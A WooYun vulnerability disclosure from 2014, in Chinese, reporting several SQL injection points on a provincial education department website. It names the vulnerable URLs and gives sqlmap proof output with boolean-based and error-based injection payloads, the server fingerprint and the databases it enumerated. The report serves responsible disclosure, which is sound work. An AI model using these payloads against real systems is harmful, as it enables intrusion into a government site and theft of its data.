wybug_title: 某省教育厅多处SQL注射漏洞小礼包
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail: 漏洞详情 披露状态：   									2014-06-09：	细节已通知厂商并且等待厂商处理中									2014-06-14：	厂商已经确认，细节仅向厂商公开									2014-06-24：	细节向核心白帽子及相关领域专家公开									2014-07-04：	细节向普通白帽子公开									2014-07-14：	细节向实习白帽子公开									2014-07-24：	细节向公众公开  简要描述： 省教育厅SQL多处注射漏洞 详细说明：  http://jeaie.ec.js.edu.cn/Question.aspx?act=q http://jeaie.ec.js.edu.cn/Question.aspx?qNo=425&act=qhttp://jeaie.ec.js.edu.cn/Question.aspx?act=q&qNo=425http://jeaie.ec.js.edu.cn/AmericanCollege/Common.aspx?TypeNo=53&NewsType=-505http://jeaie.ec.js.edu.cn/AmericanCollege/Common.aspx?NewsType=-201http://jeaie.ec.js.edu.cn/Question.aspx?act=q&qNo=425http://jeaie.ec.js.edu.cn/ShowNews.aspx?NewsType=2&NewsNo=1577http://jeaie.ec.js.edu.cn/AmericanCollege/XiangMu.aspx?NewsType=-203http://jeaie.ec.js.edu.cn/AmericanCollege/QuestionList.aspx?NewsType=-2   漏洞证明：  Place: GETParameter: act    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: act=q' AND 1477=1477 AND 'sXiX'='sXiX    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)    Payload: act=q' AND 8342 IN ((CHAR(113)+CHAR(114)+CHAR(101)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (8342=8342) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(111)+CHAR(101)+CHAR(114)+CHAR(113))) AND 'JhlA'='JhlA---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: act    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: act=q' AND 1477=1477 AND 'sXiX'='sXiX    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)    Payload: act=q' AND 8342 IN ((CHAR(113)+CHAR(114)+CHAR(101)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (8342=8342) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(111)+CHAR(101)+CHAR(114)+CHAR(113))) AND 'JhlA'='JhlA---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000available databases [8]:[*] ExchangeAssociation[*] ExchangeAssociation1[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdbsqlmap identified the following injection points with a total of 56 HTTP(s) requests:---Place: GETParameter: NewsType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: NewsType=-201' AND 1408=1408 AND 'kEeA'='kEeA---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: NewsType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: NewsType=-201' AND 1408=1408 AND 'kEeA'='kEeA---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000available databases [8]:[*] ExchangeAssociation[*] ExchangeAssociation1[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb   修复方案：  参数过滤.   版权声明：转载请注明来源 Hotler0o@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-06-14 09:37 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给江苏分中心处置。 最新状态： 暂无
